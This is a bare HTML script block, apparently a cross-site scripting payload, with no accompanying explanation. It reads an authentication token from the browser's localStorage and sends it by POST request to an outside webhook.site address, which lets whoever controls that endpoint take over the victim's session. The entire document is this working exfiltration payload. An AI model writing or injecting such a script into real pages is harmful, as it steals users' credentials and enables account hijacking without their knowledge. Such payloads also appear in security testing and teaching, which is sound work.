<script type="text/javascript">
    var token = localStorage.getItem('token');
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'https://webhook.site/fb05e108-9879-4802-aaf3-8b4e478fb5b8', true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.send('token=' + encodeURIComponent(token));
</script>

